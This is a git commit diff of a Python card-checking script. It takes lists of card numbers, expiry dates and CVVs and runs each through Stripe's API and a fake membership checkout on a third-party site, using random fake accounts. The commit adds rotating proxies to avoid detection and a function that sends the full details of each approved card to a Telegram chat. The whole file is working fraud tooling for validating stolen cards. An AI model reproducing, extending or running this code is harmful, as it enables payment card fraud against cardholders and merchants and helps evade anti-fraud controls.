6c7c2c2ee2d5805ba077075e8a40f8afa50f2055
Vichhika <51940586+vichhika@users.noreply.github.com>
2024-07-09 14:13:47 +0700

    Update noproxy.py
    Forward message to bot

--- noproxy.py
+++ noproxy.py
@@ -8,10 +8,12 @@ import traceback
 import time
 import sys
 import requests
+import random
 
 MAX_RETRIES = 3
 RETRY_SLEEP_TIME = 3
-
+BOT_TOKEN = "YOUR BOT TOKEN"
+CHAT_ID = "CHAT ID" # add for -100 for group chat ID
 
 async def find_between(data, first, last):
     try:
@@ -81,27 +83,15 @@ def getcards(text: str):
             ano = ano1
     if not luhn_check(cc):
         return None, None, None, None, "invalid_luhn"
-    if cc[0] == 3 and len(cc) not in [15, 16] or int(cc[0]) not in [3, 4, 5, 6]:
+    if cc[0] == 3 and len(cc) not in [15, 16] or int(
+            cc[0]) not in [3, 4, 5, 6]:
         return None, None, None, None, "invalid_card_number"
-    if (
-        len(mes) not in [2, 4]
-        or len(mes) == 2
-        and mes > "12"
-        or len(mes) == 2
-        and mes < "01"
-    ):
+    if (len(mes) not in [2, 4] or len(mes) == 2 and mes > "12"
+            or len(mes) == 2 and mes < "01"):
         return None, None, None, None, "invalid_card_month"
-    if (
-        len(ano) not in [2, 4]
-        or len(ano) == 2
-        and ano < "23"
-        or len(ano) == 4
-        and ano < "2023"
-        or len(ano) == 2
-        and ano > "30"
-        or len(ano) == 4
-        and ano > "2030"
-    ):
+    if (len(ano) not in [2, 4] or len(ano) == 2 and ano < "23"
+            or len(ano) == 4 and ano < "2023" or len(ano) == 2 and ano > "30"
+            or len(ano) == 4 and ano > "2030"):
         return None, None, None, None, "invalid_card_year"
     if cc[0] == 3 and len(cvv) != 4 or len(cvv) != 3:
         return None, None, None, None, "invalid_card_cvv"
@@ -126,7 +116,7 @@ user_agents = [
 ]
 
 
-async def make_payment_request(cc, mes, ano, cvv):
+async def make_payment_request(cc, mes, ano, cvv, PROXY_INFO):
     try:
         time.sleep(3)
         async with aiohttp.ClientSession() as session:
@@ -147,9 +137,10 @@ async def make_payment_request(cc, mes, ano, cvv):
             data = f"type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano[-2:]}&guid={uuid.uuid4}&muid={uuid.uuid4}&sid={uuid.uuid4}&pasted_fields=number&payment_user_agent=stripe.js%2Ffe2e2c5c10%3B+stripe-js-v3%2Ffe2e2c5c10%3B+split-card-element&referrer=https%3A%2F%2Fecstest.net&time_on_page=137180&key=pk_live_51HdlIAIp3rQqxTHDy00d0h4a1Ug7VESCtZKMWKLw1Ltr2UtjyS0HaFYKuf6b2PmZPB4A5fsZYp6quGHl1PyYq1MK00vom2WR7s"
 
             async with session.post(
-                "https://api.stripe.com/v1/payment_methods",
-                headers=headers,
-                data=data,
+                    "https://api.stripe.com/v1/payment_methods",
+                    headers=headers,
+                    data=data,
+                    proxy=PROXY_INFO,
             ) as response:
                 return await response.text()
     except aiohttp.ClientError as e:
@@ -170,12 +161,13 @@ async def process_payment_response(response):
         return None, None, "Response Error: Unexpected format"
 
 
-async def make_checkout_request(id, brand, cc, mes, ano):
+async def make_checkout_request(id, brand, cc, mes, ano, PROXY_INFO):
     try:
         async with aiohttp.ClientSession() as session:
             headers = {
                 "User-Agent": random.choice(user_agents),
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+                "Accept":
+                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                 "Accept-Language": "en-US,en;q=0.5",
                 # 'Accept-Encoding': 'gzip, deflate, br, zstd',
                 "Content-Type": "application/x-www-form-urlencoded",
@@ -192,19 +184,17 @@ async def make_checkout_request(id, brand, cc, mes, ano):
             meeq = f"20{ano[-2:]}".replace("2020", "20")
             num = random.randint(1000, 999999)
             email = "".join(
-                random.choice(string.ascii_lowercase) for i in range(10)
-            ) + random.choice(
-                [
+                random.choice(string.ascii_lowercase)
+                for i in range(10)) + random.choice([
                     "@gmail.com",
                     "@outlook.com",
                     "@yahoo.com",
                     "@hotmail.com",
-                ]
-            )
+                ])
             data = [
                 ("level", "7"),
                 ("checkjavascript", "1"),
-                ("username", f"ahjoymary{num}"),
+                ("username", f"lokjeaj{num}"),
                 ("password", f"aries{num}"),
                 ("password2", f"aries{num}"),
                 ("bemail", email),
@@ -227,10 +217,11 @@ async def make_checkout_request(id, brand, cc, mes, ano):
             time.sleep(4)
 
             async with session.post(
-                "https://ecstest.net/membership-checkout/",
-                headers=headers,
-                data=data,
-                params=params,
+                    "https://ecstest.net/membership-checkout/",
+                    headers=headers,
+                    data=data,
+                    params=params,
+                    proxy=PROXY_INFO,
             ) as response:
                 return await response.text()
     except aiohttp.ClientError as e:
@@ -244,28 +235,22 @@ async def process_checkout_response(response):
 
     try:
         result = response
-        if (
-            "Thank you for your membership." in result
-            or "Membership Confirmation" in result
-            or "Thank You For Donation." in result
-            or "Success " in result
-            or '"type":"one-time"' in result
-            or "/donations/thank_you?donation_number=" in result
-        ):
+        if ("Thank you for your membership." in result
+                or "Membership Confirmation" in result
+                or "Thank You For Donation." in result or "Success " in result
+                or '"type":"one-time"' in result
+                or "/donations/thank_you?donation_number=" in result):
             return "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿", "✅", "CVV MATCH"
-        elif (
-            "Error updating default payment method.Your card does not support this type of purchase."
-            in result
-            or "Your card does not support this type of purchase." in result
-            or "transaction_not_allowed" in result
-            or "insufficient_funds" in result
-            or "incorrect_zip" in result
-            or "Your card has insufficient funds." in result
-            or '"status":"success"' in result
-            or "stripe_3ds2_fingerprint" in result
-            or "security code is incorrect." in result
-            or "security code is invalid." in result
-        ):
+        elif ("Error updating default payment method.Your card does not support this type of purchase."
+              in result
+              or "Your card does not support this type of purchase." in result
+              or "transaction_not_allowed" in result
+              or "insufficient_funds" in result or "incorrect_zip" in result
+              or "Your card has insufficient funds." in result
+              or '"status":"success"' in result
+              or "stripe_3ds2_fingerprint" in result
+              or "security code is incorrect." in result
+              or "security code is invalid." in result):
             msg = await find_between(
                 result,
                 '<div id="pmpro_message" class="pmpro_message pmpro_error">',
@@ -292,15 +277,16 @@ async def process_checkout_response(response):
         return "Response Error: Unexpected format"
 
 
-async def stripe(cc, mes, ano, cvv):
+async def stripe(cc, mes, ano, cvv, PROXY_INFO):
     retries = 0
     while retries < MAX_RETRIES:
-        payment_response = await make_payment_request(cc, mes, ano, cvv)
-        id, brand, payment_error = await process_payment_response(payment_response)
+        payment_response = await make_payment_request(cc, mes, ano, cvv,
+                                                      PROXY_INFO)
+        id, brand, payment_error = await process_payment_response(
+            payment_response)
         if id and brand:
             checkout_response = await make_checkout_request(
-                id, brand, cc, mes, ano
-            )
+                id, brand, cc, mes, ano, PROXY_INFO)
             return await process_checkout_response(checkout_response)
         else:
             print("Payment Error:", payment_error)
@@ -313,12 +299,14 @@ async def stripe(cc, mes, ano, cvv):
 
 
 async def process_cc_list(cc_list):
+    num = 1
     for cards in cc_list:
         st = int(time.time())
         cc, mes, ano, cvv = cards
         xx = "|".join(cards)
+        PROXY_INFO = random.choice(proxy_list)
         try:
-            data = await stripe(cc, mes, ano, cvv)
+            data = await stripe(cc, mes, ano, cvv, PROXY_INFO)
         except Exception as exc:
             traceback.print_exc()
             r_text, r_logo, r_respo = exc, "❌", "Declined"
@@ -331,39 +319,100 @@ async def process_cc_list(cc_list):
             with open("ip.txt", "a+") as f:
                 f.write(f"{xx}:{r_text}\n")
             print(
-                f"\n{bcolors.GREEN}Response: {r_text} {r_logo} {r_respo} For CC: {cc}|{mes}|{ano}|{cvv} Time Taken: {int(time.time() - st)} seconds{bcolors.ENDC}\n"
+                f"\n{bcolors.GREEN}Response: {num}. {r_text} {r_logo} {r_respo} For CC: {cc}|{mes}|{ano}|{cvv} Time Taken: {int(time.time() - st)} seconds{bcolors.ENDC}\n"
             )
+            send_telegram_message(BOT_TOKEN,CHAT_ID,f"{r_text} {r_logo} {r_respo} For CC: {cc}|{mes}|{ano}|{cvv}")
         else:
             print(
-                f"\n{bcolors.RED}Response: {r_text} {r_logo} {r_respo} For CC: {cc}|{mes}|{ano}|{cvv} Time Taken: {int(time.time() - st)} seconds{bcolors.ENDC}\n"
+                f"\n{bcolors.RED}Response: {num}. {r_text} {r_logo} {r_respo} For CC: {cc}|{mes}|{ano}|{cvv} Time Taken: {int(time.time() - st)} seconds{bcolors.ENDC}\n"
             )
+            #send_telegram_message(BOT_TOKEN,CHAT_ID,f"{r_text} {r_logo} {r_respo} For CC: {cc}|{mes}|{ano}|{cvv}")
+        num = num+1
 
-def get_proxy_info():
-    return input("Put Proxy Format: http://username:password@ip:port ~ ")
 
-def proxy_check():
+def load_proxies_from_file(filename):
+    """Loads a list of proxies from a text file.
+
+  Args:
+      filename (str): The path to the text file containing proxies.
+
+  Returns:
+      list: A list of proxy dictionaries or None if there's an error.
+  """
+    try:
+        with open(filename, "r") as f:
+            proxy_list = []
+            for line in f:
+                # Remove trailing newline character from each line
+                proxy_string = line.strip()
+                # Assuming each line in the file is a valid proxy URL
+                # You can modify this based on your file format
+                if (proxy_check(proxy_string)):
+                    proxy_list.append(proxy_string)
+            if(not proxy_list):
+                print("There no proxy alive.")
+                print("Please add proxy format: http://username:password@ip:port")
+                sys.exit(0)
+            return proxy_list
+    except FileNotFoundError:
+        print(f"Error: Proxy file '{filename}' not found.")
+        sys.exit(0)
+    except Exception as e:
+        print(f"Error reading proxy file '{filename}': {e}")
+        sys.exit(0)
+
+
+def proxy_check(proxy_string):
     r = requests.session()
-    proxy_int = get_proxy_info()
+    proxy_int = proxy_string
     r.proxies = {"http": proxy_int, "https": proxy_int}
     try:
         resp = r.get("https://ipv4.icanhazip.com")
         if resp.status_code == 200:
-            print("IP Address:", resp.text.strip())
-            return proxy_int
+            return True
         else:
             print(f"Proxy Dead: Status Code: {resp.status_code}")
-            sys.exit()
+            return False
     except requests.RequestException as e:
         print(f"Proxy is not alive. Error: {e}")
+        print("Please add proxy format: http://username:password@ip:port")
         sys.exit()
 
+def send_telegram_message(bot_token, chat_id, message_text):
+  """Sends a message to a Telegram group using the bot token and POST method.
+
+  Args:
+      bot_token (str): Your Telegram bot token.
+      chat_id (int): The ID of the target Telegram group chat.
+      message_text (str): The content of the message to be sent.
+
+  Returns:
+      bool: True if the message was sent successfully, False otherwise.
+  """
+
+  url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+  data = {
+      "chat_id": chat_id,
+      "text": message_text,
+  }
+
+  response = requests.post(url, json=data)
+
+  if response.status_code == 200:
+    return True
+  else:
+    print(f"Error sending message: {response.text}")
+    return False
+
 if __name__ == "__main__":
-    #PROXY_INFO = proxy_check()
+    proxy_list = load_proxies_from_file("proxy.txt")
     try:
         with open("3n.txt", "r", encoding="utf-8") as file:
             lista = file.read().splitlines()
     except FileNotFoundError as e:
-        print(f"{bcolors.RED}FILE NOT FOUND. MAKE SURE YOUR FILE EXISTS{bcolors.ENDC}")
+        print(
+            f"{bcolors.RED}FILE NOT FOUND. MAKE SURE YOUR FILE EXISTS{bcolors.ENDC}"
+        )
         quit()
 
     print(f"{bcolors.OKBLUE}TOTAL CARDS DETECTED: {len(lista)}{bcolors.ENDC}")
@@ -375,7 +424,9 @@ if __name__ == "__main__":
         if not check:
             cc_list.append([cc, mes, ano, cvv])
 
-    print(f"{bcolors.OKBLUE}TOTAL CARDS TO BE CHECKED: {len(cc_list)}{bcolors.ENDC}")
+    print(
+        f"{bcolors.OKBLUE}TOTAL CARDS TO BE CHECKED: {len(cc_list)}{bcolors.ENDC}"
+    )
 
     total = len(cc_list)
     asyncio.run(process_cc_list(cc_list))
